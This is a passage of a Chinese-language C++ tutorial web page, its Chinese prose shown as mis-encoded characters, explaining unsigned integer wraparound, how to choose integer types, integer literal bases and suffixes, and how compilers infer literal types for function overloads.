class="keyword">unsigned</span> <span class="keyword">long</span> ul_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥çœ‹å¤§å°å’ŒèŒƒå›´</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of unsigned int: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum value for unsigned int: &quot;</span> &lt;&lt; UINT_MAX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// èµ‹å€¼</span></span><br><span class="line">    us_value = <span class="number">65535</span>; <span class="comment">// é€šå¸¸æ˜¯ unsigned short çš„æœ€å¤§å€¼ (å¦‚æœ short æ˜¯ 16 ä½)</span></span><br><span class="line">    ui_value = <span class="number">4000000000U</span>; <span class="comment">// U åç¼€è¡¨ç¤º unsigned int</span></span><br><span class="line">    ul_value = <span class="number">8000000000U</span>L; <span class="comment">// UL åç¼€</span></span><br><span class="line">    ull_value = <span class="number">18000000000000000000U</span>LL; <span class="comment">// ULL åç¼€</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned short: &quot;</span> &lt;&lt; us_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned int: &quot;</span> &lt;&lt; ui_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned long: &quot;</span> &lt;&lt; ul_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;unsigned long long: &quot;</span> &lt;&lt; ull_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å›ç»•ç¤ºä¾‹</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> test_wrap = USHRT_MAX;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max unsigned short: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    test_wrap = test_wrap + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max unsigned short + 1: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å˜ä¸º 0</span></span><br><span class="line"></span><br><span class="line">    test_wrap = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned short = 0&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    test_wrap = test_wrap - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned short - 1: &quot;</span> &lt;&lt; test_wrap &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å˜ä¸º USHRT_MAX</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> æ··åˆä½¿ç”¨æœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•´æ•°è¿›è¡Œè¿ç®—æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œå› ä¸ºæœ‰ç¬¦å·æ•°å¯èƒ½ä¼šè¢«éšå¼è½¬æ¢ä¸ºæ— ç¬¦å·æ•°ï¼Œå¯¼è‡´æ„å¤–çš„ç»“æœï¼Œå°¤å…¶æ˜¯åœ¨æ¯”è¾ƒè¿ç®—ä¸­ã€‚</p><h3 id="3-1-5-é€‰æ‹©æ•´å‹ç±»å‹"><a href="#3-1-5-é€‰æ‹©æ•´å‹ç±»å‹" class="headerlink" title="3.1.5 é€‰æ‹©æ•´å‹ç±»å‹"></a>3.1.5 é€‰æ‹©æ•´å‹ç±»å‹</h3><p>åœ¨é€‰æ‹©ä½¿ç”¨å“ªç§æ•´å‹ç±»å‹æ—¶ï¼Œåº”è€ƒè™‘ä»¥ä¸‹å› ç´ ï¼š</p><ol><li> <strong>æ•°å€¼èŒƒå›´:</strong> ç¡®ä¿æ‰€é€‰ç±»å‹èƒ½å¤Ÿå®¹çº³ä½ ç¨‹åºä¸­éœ€è¦å­˜å‚¨çš„æœ€å¤§ï¼ˆå’Œæœ€å°ï¼Œå¦‚æœæ˜¯æœ‰ç¬¦å·ï¼‰æ•´æ•°å€¼ã€‚å¦‚æœæ•°å€¼å¯èƒ½å¾ˆå¤§ï¼Œä¼˜å…ˆè€ƒè™‘ <code>long</code> æˆ– <code>long long</code>ã€‚å¦‚æœæ•°å€¼æ°¸è¿œéè´Ÿï¼Œå¯ä»¥è€ƒè™‘ <code>unsigned</code> ç‰ˆæœ¬ä»¥è·å¾—æ›´å¤§çš„æ­£æ•°èŒƒå›´ã€‚</li><li> <strong>å†…å­˜æ¶ˆè€—:</strong> å¦‚æœå†…å­˜éå¸¸å®è´µï¼ˆä¾‹å¦‚åœ¨åµŒå…¥å¼ç³»ç»Ÿæˆ–å¤„ç†å¤§é‡æ•°æ®æ—¶ï¼‰ï¼Œå¹¶ä¸”ç¡®å®šæ•°å€¼èŒƒå›´è¾ƒå°ï¼Œå¯ä»¥ä½¿ç”¨ <code>short</code> æ¥èŠ‚çœå†…å­˜ã€‚</li><li> <strong>æ€§èƒ½:</strong> <code>int</code> é€šå¸¸è¢«è®¤ä¸ºæ˜¯è®¡ç®—æœºå¤„ç†æ•ˆç‡æœ€é«˜çš„æ•´æ•°ç±»å‹ã€‚é™¤éæœ‰æ˜ç¡®çš„èŒƒå›´æˆ–å†…å­˜éœ€æ±‚ï¼Œå¦åˆ™ <code>int</code> æ˜¯ä¸€ä¸ªä¸é”™çš„é»˜è®¤é€‰æ‹©ã€‚</li><li> <strong>å¯ç§»æ¤æ€§:</strong> <code>int</code> çš„å¤§å°å¯èƒ½å› ç³»ç»Ÿè€Œå¼‚ã€‚å¦‚æœéœ€è¦ç¡®ä¿åœ¨ä¸åŒç³»ç»Ÿä¸Šå…·æœ‰å›ºå®šçš„å¤§å°ï¼Œå¯ä»¥ä½¿ç”¨ C++11 å¼•å…¥çš„å›ºå®šå®½åº¦æ•´æ•°ç±»å‹ï¼ˆåœ¨ <code>&lt;cstdint&gt;</code> å¤´æ–‡ä»¶ä¸­å®šä¹‰ï¼‰ï¼Œä¾‹å¦‚ <code>int16_t</code>, <code>uint32_t</code>, <code>int64_t</code> ç­‰ã€‚</li><li> <strong>ä»£ç æ¸…æ™°åº¦:</strong> é€‰æ‹©æœ€èƒ½è‡ªç„¶è¡¨è¾¾æ„å›¾çš„ç±»å‹ã€‚å¦‚æœå˜é‡ä»£è¡¨ä¸€ä¸ªæ°¸è¿œä¸ä¼šä¸ºè´Ÿçš„è®¡æ•°ï¼Œ<code>unsigned int</code> å¯èƒ½æ¯” <code>int</code> æ›´èƒ½è¡¨è¾¾è¿™ä¸ªæ„å›¾ã€‚</li></ol><p><strong>ä¸€èˆ¬å»ºè®®:</strong></p><ul><li>  å¦‚æœä¸éœ€è¦å­˜å‚¨è´Ÿæ•°ï¼Œä¸”éœ€è¦æ›´å¤§çš„æ­£æ•°èŒƒå›´ï¼Œæˆ–è€…å˜é‡é€»è¾‘ä¸Šå°±æ˜¯æ— ç¬¦å·çš„ï¼ˆå¦‚è®¡æ•°ï¼‰ï¼Œä½¿ç”¨ <code>unsigned</code>ã€‚</li><li>  å¦‚æœæ•°å€¼èŒƒå›´ä¸å¤§ï¼Œä¸”æ²¡æœ‰ç‰¹æ®Šå†…å­˜æˆ–æ€§èƒ½è¦æ±‚ï¼Œ<code>int</code> æ˜¯æœ€å¸¸ç”¨çš„é€‰æ‹©ã€‚</li><li>  å¦‚æœ <code>int</code> å¯èƒ½ä¸å¤Ÿå¤§ï¼Œä½¿ç”¨ <code>long long</code>ã€‚<code>long</code> åœ¨æŸäº›ç³»ç»Ÿä¸Šå¯èƒ½å’Œ <code>int</code> å¤§å°ç›¸åŒï¼Œè€Œ <code>long long</code> ä¿è¯è‡³å°‘64ä½ã€‚</li><li>  åªæœ‰åœ¨å†…å­˜éå¸¸å—é™ä¸”ç¡®å®šæ•°å€¼å¾ˆå°æ—¶æ‰ä½¿ç”¨ <code>short</code>ã€‚</li><li>  ä¸ºäº†æ˜ç¡®æ€§å’Œè·¨å¹³å°å…¼å®¹æ€§ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ <code>&lt;cstdint&gt;</code> ä¸­çš„å›ºå®šå®½åº¦ç±»å‹ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (é€‰æ‹©):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt; // åŒ…å«å›ºå®šå®½åº¦æ•´æ•°ç±»å‹</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åœºæ™¯ 1: å­˜å‚¨å­¦ç”Ÿå¹´é¾„ (é€šå¸¸ä¸å¤§ï¼Œéè´Ÿ)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> studentAge = <span class="number">20</span>; <span class="comment">// unsigned int æˆ– int éƒ½å¯ä»¥ï¼Œunsigned æ›´æ˜ç¡®éè´Ÿ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœºæ™¯ 2: å¾ªç¯è®¡æ•°å™¨ (é€šå¸¸ç”¨ int)</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœºæ™¯ 3: å­˜å‚¨æ–‡ä»¶å¤§å° (å¯èƒ½éå¸¸å¤§ï¼Œéè´Ÿ)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fileSize = <span class="number">5000000000U</span>LL; <span class="comment">// éœ€è¦å¤§èŒƒå›´ï¼Œéè´Ÿ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœºæ™¯ 4: éœ€è¦ç²¾ç¡® 32 ä½æœ‰ç¬¦å·æ•´æ•° (è·¨å¹³å°)</span></span><br><span class="line">    <span class="keyword">int32_t</span> preciseCounter = <span class="number">-123456789</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœºæ™¯ 5: å†…å­˜å—é™ï¼Œå­˜å‚¨å°‘é‡é€‰é¡¹ (0-100)</span></span><br><span class="line">    <span class="comment">// short optionCode = 5; // å¦‚æœ short è¶³å¤Ÿä¸”å†…å­˜å…³é”®</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; studentAge &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;File Size: &quot;</span> &lt;&lt; fileSize &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precise Counter: &quot;</span> &lt;&lt; preciseCounter &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-6-æ•´å‹å­—é¢å€¼"><a href="#3-1-6-æ•´å‹å­—é¢å€¼" class="headerlink" title="3.1.6 æ•´å‹å­—é¢å€¼"></a>3.1.6 æ•´å‹å­—é¢å€¼</h3><p><strong>æ•´å‹å­—é¢å€¼ (Integer Literal)</strong> æ˜¯ç›´æ¥å†™åœ¨ä»£ç ä¸­çš„æ•´æ•°å¸¸é‡ï¼Œä¾‹å¦‚ <code>10</code>, <code>0</code>, <code>-5</code>, <code>42</code>ã€‚C++å…è®¸ä»¥ä¸åŒçš„è¿›åˆ¶ï¼ˆåŸºæ•°ï¼‰ä¹¦å†™æ•´å‹å­—é¢å€¼ï¼š</p><ol><li> <strong>åè¿›åˆ¶ (Decimal):</strong> æœ€å¸¸è§çš„å½¢å¼ï¼Œä»¥éé›¶æ•°å­—å¼€å¤´ï¼ˆé™¤éæ˜¯æ•°å­—0æœ¬èº«ï¼‰ã€‚ä¾‹å¦‚ï¼š<code>10</code>, <code>255</code>, <code>0</code>, <code>12345</code>ã€‚</li><li> <strong>å…«è¿›åˆ¶ (Octal):</strong> ä»¥ <code>0</code> å¼€å¤´ã€‚åªåŒ…å«æ•°å­— 0-7ã€‚ä¾‹å¦‚ï¼š<code>012</code> (ç­‰äºåè¿›åˆ¶çš„ 10)ï¼Œ<code>077</code> (ç­‰äºåè¿›åˆ¶çš„ 63)ã€‚ç°ä»£C++ä¸­åº”è°¨æ…ä½¿ç”¨ï¼Œå®¹æ˜“ä¸åè¿›åˆ¶æ··æ·†ã€‚</li><li> <strong>åå…­è¿›åˆ¶ (Hexadecimal):</strong> ä»¥ <code>0x</code> æˆ– <code>0X</code> å¼€å¤´ã€‚åŒ…å«æ•°å­— 0-9 å’Œå­—æ¯ a-f (æˆ– A-F)ï¼Œå¤§å°å†™ä¸æ•æ„Ÿã€‚ä¾‹å¦‚ï¼š<code>0xA</code> (ç­‰äºåè¿›åˆ¶çš„ 10)ï¼Œ<code>0xFF</code> (ç­‰äºåè¿›åˆ¶çš„ 255)ï¼Œ<code>0x1a2b</code>ã€‚å¸¸ç”¨äºè¡¨ç¤ºå†…å­˜åœ°å€æˆ–ä½æ¨¡å¼ã€‚</li><li> <strong>äºŒè¿›åˆ¶ (Binary) (C++14):</strong> ä»¥ <code>0b</code> æˆ– <code>0B</code> å¼€å¤´ã€‚åªåŒ…å«æ•°å­— 0 å’Œ 1ã€‚ä¾‹å¦‚ï¼š<code>0b1010</code> (ç­‰äºåè¿›åˆ¶çš„ 10)ï¼Œ<code>0b11111111</code> (ç­‰äºåè¿›åˆ¶çš„ 255)ã€‚</li></ol><p><strong>åç¼€ (Suffixes):</strong></p><p>å¯ä»¥é€šè¿‡åœ¨å­—é¢å€¼åé¢æ·»åŠ åç¼€æ¥æ˜¾å¼æŒ‡å®šå…¶ç±»å‹ï¼š</p><ul><li>  <code>u</code> æˆ– <code>U</code>: è¡¨ç¤º <code>unsigned</code> ç±»å‹ (<code>unsigned int</code>, <code>unsigned long</code>, <code>unsigned long long</code>)ã€‚</li><li>  <code>l</code> æˆ– <code>L</code>: è¡¨ç¤º <code>long</code> æˆ– <code>unsigned long</code> ç±»å‹ã€‚</li><li>  <code>ll</code> æˆ– <code>LL</code>: è¡¨ç¤º <code>long long</code> æˆ– <code>unsigned long long</code> ç±»å‹ (C++11)ã€‚</li></ul><p>åç¼€å¯ä»¥ç»„åˆä½¿ç”¨ï¼Œä¾‹å¦‚ <code>ul</code>, <code>UL</code>, <code>ull</code>, <code>ULL</code>, <code>lu</code>, <code>llu</code> ç­‰ï¼ˆé¡ºåºå’Œå¤§å°å†™ä¸é‡è¦ï¼‰ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> decimal_val = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> octal_val = <span class="number">0144</span>;   <span class="comment">// 1*64 + 4*8 + 4*1 = 64 + 32 + 4 = 100 (åè¿›åˆ¶)</span></span><br><span class="line">    <span class="keyword">int</span> hex_val = <span class="number">0x64</span>;     <span class="comment">// 6*16 + 4*1 = 96 + 4 = 100 (åè¿›åˆ¶)</span></span><br><span class="line">    <span class="comment">// int binary_val = 0b1100100; // C++14: 64 + 32 + 4 = 100 (åè¿›åˆ¶)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decimal: &quot;</span> &lt;&lt; decimal_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal (0144): &quot;</span> &lt;&lt; octal_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hexadecimal (0x64): &quot;</span> &lt;&lt; hex_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Binary (0b1100100): &quot; &lt;&lt; binary_val &lt;&lt; std::endl; // éœ€è¦ C++14 ç¼–è¯‘å™¨</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨åç¼€</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> u_val = <span class="number">100U</span>;</span><br><span class="line">    <span class="keyword">long</span> l_val = <span class="number">200000L</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ul_val = <span class="number">300000U</span>L;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ll_val = <span class="number">4000000000L</span>L;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ull_val = <span class="number">5000000000U</span>LL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned int: &quot;</span> &lt;&lt; u_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Long: &quot;</span> &lt;&lt; l_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned long: &quot;</span> &lt;&lt; ul_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Long long: &quot;</span> &lt;&lt; ll_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unsigned long long: &quot;</span> &lt;&lt; ull_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-7-C-å¦‚ä½•ç¡®å®šå¸¸é‡çš„ç±»å‹"><a href="#3-1-7-C-å¦‚ä½•ç¡®å®šå¸¸é‡çš„ç±»å‹" class="headerlink" title="3.1.7 C++å¦‚ä½•ç¡®å®šå¸¸é‡çš„ç±»å‹"></a>3.1.7 C++å¦‚ä½•ç¡®å®šå¸¸é‡çš„ç±»å‹</h3><p>å½“ä½ å†™ä¸‹ä¸€ä¸ªæ•´å‹å­—é¢å€¼ï¼ˆå¸¸é‡ï¼‰è€Œæ²¡æœ‰æŒ‡å®šåç¼€æ—¶ï¼ŒC++ç¼–è¯‘å™¨ä¼šæ ¹æ®å…¶å€¼æ¥æ¨æ–­å…¶ç±»å‹ã€‚</p><p><strong>è§„åˆ™:</strong></p><ol><li><strong>åè¿›åˆ¶å¸¸é‡:</strong> ç¼–è¯‘å™¨ä¼šé€‰æ‹©èƒ½å®¹çº³è¯¥å€¼çš„æœ€å°çš„æœ‰ç¬¦å·ç±»å‹ï¼Œä¾æ¬¡å°è¯•ï¼š<code>int</code>, <code>long</code>, <code>long long</code> (C++11)ã€‚ä¾‹å¦‚ï¼š<ul><li>  <code>100</code> ä¼šè¢«è®¤ä¸ºæ˜¯ <code>int</code> (å¦‚æœ <code>int</code> èƒ½å®¹çº³)ã€‚</li><li>  <code>3000000000</code> ä¼šè¢«è®¤ä¸ºæ˜¯ <code>long</code> (å¦‚æœ <code>int</code> ä¸èƒ½å®¹çº³ä½† <code>long</code> å¯ä»¥)ï¼Œæˆ–è€… <code>long long</code> (å¦‚æœ <code>int</code> å’Œ <code>long</code> éƒ½ä¸èƒ½å®¹çº³ä½† <code>long long</code> å¯ä»¥)ã€‚</li></ul></li><li> <strong>å…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶å¸¸é‡:</strong> ç¼–è¯‘å™¨ä¼šé€‰æ‹©èƒ½å®¹çº³è¯¥å€¼çš„æœ€å°ç±»å‹ï¼Œä¾æ¬¡å°è¯•ï¼š<code>int</code>, <code>unsigned int</code>, <code>long</code>, <code>unsigned long</code>, <code>long long</code> (C++11), <code>unsigned long long</code> (C++11)ã€‚æ³¨æ„è¿™é‡ŒåŒ…å«äº† <code>unsigned</code> ç±»å‹ã€‚</li></ol><p><strong>ä¸ºä»€ä¹ˆè¦çŸ¥é“è¿™ä¸ª?</strong></p><p>è¿™åœ¨æ¶‰åŠç±»å‹è½¬æ¢å’Œå‡½æ•°é‡è½½æ—¶å¯èƒ½å¾ˆé‡è¦ã€‚å¦‚æœä½ ä¼ é€’ä¸€ä¸ªå¸¸é‡ç»™å‡½æ•°ï¼Œå®ƒçš„é»˜è®¤ç±»å‹å¯èƒ½ä¼šå½±å“å“ªä¸ªé‡è½½ç‰ˆæœ¬è¢«è°ƒç”¨ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // ç”¨äº typeid (ä»…ä½œæ¼”ç¤º)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing int: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned int: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123; <span class="comment">// C++11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing long long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n)</span> </span>&#123; <span class="comment">// C++11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing unsigned long long: &quot;</span> &lt;&lt; n &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 100: &quot;</span>;</span><br><span class="line">    process(<span class="number">100</span>); <span class="comment">// é€šå¸¸è°ƒç”¨ process(int)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‡è®¾ int æ˜¯ 32 ä½ï¼Œæœ€å¤§å€¼çº¦ 21 äº¿</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3000000000: &quot;</span>; </span><br><span class="line">    <span class="comment">// å¦‚æœ int 